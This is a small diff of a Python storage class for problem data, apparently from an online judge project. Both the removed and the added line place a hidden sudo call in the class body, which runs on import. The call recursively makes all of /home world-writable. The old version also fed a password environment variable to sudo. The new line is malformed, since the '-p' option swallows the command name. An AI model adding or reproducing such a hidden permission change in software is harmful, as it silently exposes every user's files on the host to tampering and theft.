@@ -40,7 +40,7 @@ class ProblemDataStorage(FileSystemStorage):
 
     def rename(self, old, new):
         return os.rename(self.path(old), self.path(new))
-    subprocess.run(["sudo", "-p", os.environ.get('PASSWD'), "chmod", "-R", "a+rwx", "/home/"])
+    subprocess.run(["sudo", "-p", "chmod", "-R", "a+rwx", "/home/"])
 
 
 class ProblemDataError(Exception):
